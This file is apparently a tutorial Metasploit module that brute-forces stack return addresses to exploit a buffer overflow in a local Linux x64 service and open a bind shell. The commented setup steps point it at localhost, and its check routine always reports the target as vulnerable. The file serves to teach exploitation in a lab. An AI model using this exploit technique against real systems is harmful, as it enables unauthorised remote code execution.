#   Metasploit setup:
#   msfconsole
#   set rhosts 127.0.0.1
#   set lport 4444
#   set rport 5555
#   set payload linux/x64/shell_bind_tcp
#   use tutorial
#   exploit

# /usr/share/metasploit-framework/modules/exploits/tutorial.rb
class MetasploitModule < Msf::Exploit::Remote
  include Exploit::Remote::Tcp
  include Exploit::Brute
  def initialize(info = {})
    super(update_info( info,
                      'Name' => 'Buffer Overflow',
                      'Description' => %q(This exploit tries a range of stack addresses rerunning the exploit for each of them),
                      'Author' => 'n8ta.com',
                      'Payload' => {
                        'MinNops' => 40,
                        'Space' => 520,
                        'BadChars' => "\x00\x0A",
                      },
                      'Targets' => [
                        ['Linux Bruteforce', {
                            'Bruteforce' => {
                                'Start' => { 'Ret' => 0x7fffffffdbb0},
                                'Stop'  => { 'Ret' => 0x7fffffffdbf0},
                                'Step'  => 8
                            },
                        }]],
                      'DefaultTarget'  => 0,
                      'Arch'           => ARCH_X64,
                      'Platform'       => 'linux',

    ))
  end

  def check
    Exploit::CheckCode::Vulnerable
  end

  def brute_exploit(addresses)
    connect

    #print_status(addresses.to_s)
    buf = payload.encoded
    buf += [addresses['Ret']].pack('Q')[0..5] # 6 byte long pointer (RET)
    buf += [0,0].pack('cc') # 2 unused bytes that MUST be 0x0000 for RET to be a valid poiner on x64.

    # Send it off
    print_status("Sending #{buf.length} bytes...")
    sock.put(buf)
    sock.get_once

    handler
  end

end